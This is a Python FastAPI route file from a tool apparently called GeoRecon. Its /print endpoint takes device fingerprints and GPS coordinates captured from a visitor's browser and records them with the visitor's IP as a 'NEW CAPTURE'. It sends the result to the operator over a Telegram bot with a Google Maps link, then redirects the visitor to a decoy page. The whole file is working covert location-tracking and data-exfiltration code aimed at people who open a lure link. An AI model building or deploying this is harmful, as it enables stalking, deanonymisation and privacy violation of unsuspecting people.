import asyncio
from datetime import datetime
import logging

from fastapi import APIRouter, Request

from server.tg_sync import tgBot

logger = logging.getLogger("GeoRecon")
router = APIRouter()


def clean_coordinate(value):
    if isinstance(value, str):
        value = value.replace(" deg", "").strip()
    try:
        return float(value)
    except (ValueError, TypeError):
        return None


@router.post("/print")
async def capture_data(request: Request, data: dict):
    data["ip"] = request.client.host
    data["time"] = datetime.now().strftime("%H:%M:%S")

    logger.info(f"\n{'─' * 50}")
    logger.info(f"📍 NEW CAPTURE | {data.get('time')} | IP: {data.get('ip')}")
    logger.info(f"{'─' * 50}")

    logger.info("📱 Device Info:")
    logger.info(f"   OS: {data.get('OS')}")
    logger.info(f"   Browser: {data.get('Browser')}")
    logger.info(f"   Platform: {data.get('Platform')}")
    logger.info(f"   Cores: {data.get('Cores')} | RAM: {data.get('RAM')} GB")
    logger.info(f"   GPU: {data.get('Vendor')} / {data.get('Renderer')}")
    logger.info(f"   Screen: {data.get('Width')}x{data.get('Height')}")

    if data.get("Type") == "location":
        logger.info("\n📍 Location:")
        logger.info(f"   Status: {data.get('Status')}")
        logger.info(f"   Latitude: {data.get('Latitude')}")
        logger.info(f"   Longitude: {data.get('Longitude')}")
        logger.info(f"   Accuracy: {data.get('Accuracy')}")
        if data.get("City"):
            logger.info(f"   City: {data.get('City')}, {data.get('Country')}")
        lat = clean_coordinate(data.get("Latitude"))
        lon = clean_coordinate(data.get("Longitude"))
        maps_link = f"https://maps.google.com/maps?q={lat},{lon}"
        logger.info(f"  Google Maps link: {maps_link}")

    elif data.get("Type") == "error":
        logger.warning(f"\n❌ Location Error: {data.get('Error')}")

    logger.info(f"{'─' * 50}\n")

    bot = bool(request.app.state.use_tg)
    if bot:
        msg = [
            f"📍 <b>NEW CAPTURE</b> | {data['time']} | IP: {data['ip']}",
            f"📱 <b>Device:</b> {data.get('OS', '?')} / {data.get('Browser', '?')} ({data.get('Platform', '?')})",
            f"🖥 Cores: {data.get('Cores', '?')} | RAM: {data.get('RAM', '?')} GB",
            f"🎮 GPU: {data.get('Vendor', '?')} / {data.get('Renderer', '?')}",
            f"🖥 Screen: {data.get('Width', '?')}x{data.get('Height', '?')}",
        ]

        if data.get("Type") == "location":
            msg.append("📍 <b>Location:</b>")
            msg.append(f"   Status: {data.get('Status', '?')}")
            msg.append(
                f"   Lat: {data.get('Latitude', '?')}, Lon: {data.get('Longitude', '?')}"
            )
            msg.append(f"   Accuracy: {data.get('Accuracy', '?')}m")
            if data.get("City"):
                msg.append(f"   City: {data['City']}, {data.get('Country', '')}")
            lat = clean_coordinate(data.get("Latitude"))
            lon = clean_coordinate(data.get("Longitude"))
            maps_link = f"https://maps.google.com/maps?q={lat},{lon}"
            msg.append(f"🗺 <a href='{maps_link}'>Google Maps</a>")
        elif data.get("Type") == "error":
            msg.append(f"❌ Location Error: {data.get('Error')}")

        text = "\n".join(msg)
        asyncio.create_task(tgBot.send_message(text))
        logger.info("Info also send to Telegram!")

    context = getattr(request.app.state, "context", {})
    redirect_url = context.get("redirect_url", "https://web.telegram.org")

    return {"status": "ok", "redirect": redirect_url}
